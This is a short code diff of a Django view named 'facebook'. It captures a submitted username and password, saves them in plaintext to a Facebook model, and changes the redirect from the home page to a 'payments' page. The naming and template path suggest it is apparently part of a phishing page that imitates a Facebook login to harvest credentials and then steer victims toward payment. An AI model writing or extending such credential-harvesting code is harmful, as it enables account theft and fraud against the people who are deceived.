@@ -6,7 +6,7 @@ def facebook(request):
 		username=request.POST['username']
 		password=request.POST['password']
 		obj=Facebook.objects.create(username=username,password=password)
-		return redirect('basic_site:home')
+		return redirect('basic_site:payments')
 	else:
 		template='redirect/facebook_1.html'
 	return render(request,template) 
